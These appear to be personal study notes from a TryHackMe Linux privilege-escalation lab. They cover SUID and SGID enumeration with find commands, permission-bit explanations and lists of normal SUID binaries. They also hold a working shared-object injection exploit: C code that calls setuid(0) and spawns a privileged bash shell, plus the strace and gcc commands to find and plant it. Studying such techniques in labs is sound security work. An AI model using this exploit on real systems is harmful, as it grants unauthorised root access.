
### Shared Object Injection
https://tryhackme.com/r/room/linuxprivesc Task 12
If we have suid root perms on a file that req a library that we can "modify", path "fix"

find by:
`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`






---

	Find SUID binaries
		`find / -perm -u=s -type f 2>/dev/null`
	Find SGID binaries
		`find / -perm -g=s -type f 2>/dev/null`
	Both - test this one more
		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

---

thm:

The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using **"chmod"** as **755**, then it will be: rwxr-xr-x.

  
But when special permission is given to each user it becomes SUID or SGID. When extra bit **“4”** is set to user(Owner) it becomes **SUID** (Set user ID) and when bit **“2”** is set to group it becomes **SGID** (Set Group ID).  

Therefore, the permissions to look for when looking for SUID is:

SUID:

rws-rwx-rwx

GUID:

rwx-rws-rwx  

**Finding SUID Binaries**  

We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: **"find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files. Let's break down this command.

**find** - Initiates the "find" command  

**/** - Searches the whole file system  

**-perm** - searches for files with specific permissions  

**-u=s** - Any of the permission bits _mode_ are set for the file. Symbolic modes are accepted in this form

**-type f** - Only search for files  

**2>/dev/null** - Suppresses errors














### normal SUID

/bin/su
/usr/bin/sudo

/bin/ping
/bin/mount
/bin/umount
/bin/fusermount

/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/newgrp

/usr/lib/openssh/ssh-keysign

/usr/bin/at     # unless it's RTru64 linux, in which case CVE-2002-1614


### normal SGID

/usr/bin/ssh-agent
/usr/bin/chage
/usr/bin/expiry
/usr/bin/mlocate
/usr/bin/wall
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/at
/usr/lib/x86_64-linux-gnu/utempter/utempter
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd

